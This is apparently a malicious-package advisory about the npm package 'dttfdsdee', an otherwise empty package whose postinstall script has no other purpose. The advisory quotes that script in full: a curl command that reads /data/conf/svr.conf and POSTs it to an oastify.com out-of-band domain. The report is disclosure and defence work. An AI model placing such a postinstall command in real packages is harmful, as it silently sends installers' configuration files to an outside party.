summary: Postinstall exfiltrates /data/conf/svr.conf to attacker-controlled OAST domain
details: package.json declares a postinstall lifecycle script that runs `curl -X POST -d "$(cat /data/conf/svr.conf)" http://3dhd6wwmusbh04m22igmzvb4hvnmblza.oastify.com/data/conf/svr.conf`. On `npm install`, the script reads the contents of /data/conf/svr.conf from the installer's filesystem and POSTs the file body to a Burp Collaborator (oastify.com) out-of-band subdomain controlled by whoever provisioned the OAST payload. The package is otherwise hollow — random name `dttfdsdee`, empty author/repository/homepage fields, generic 'string utility functions' description — with no library functionality. The postinstall is the entire purpose of the package.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
